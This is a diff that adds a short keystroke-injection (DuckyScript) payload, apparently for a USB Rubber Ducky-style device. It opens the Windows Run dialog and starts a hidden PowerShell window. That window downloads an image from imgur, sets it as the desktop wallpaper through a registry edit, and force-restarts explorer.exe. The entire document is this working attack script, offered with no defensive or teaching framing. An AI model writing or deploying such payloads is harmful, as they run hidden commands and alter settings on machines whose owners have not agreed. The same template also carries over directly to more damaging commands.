@@ -1,0 +1,5 @@
+DELAY 800
+GUI r
+DELAY 200
+STRING powershell -w hidden -c "iwr https://i.imgur.com/OlMHsrU.png -o $env:TEMP\wp.png; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /d $env:TEMP\wp.png /f; taskkill /f /im explorer.exe; start explorer.exe"
+ENTER
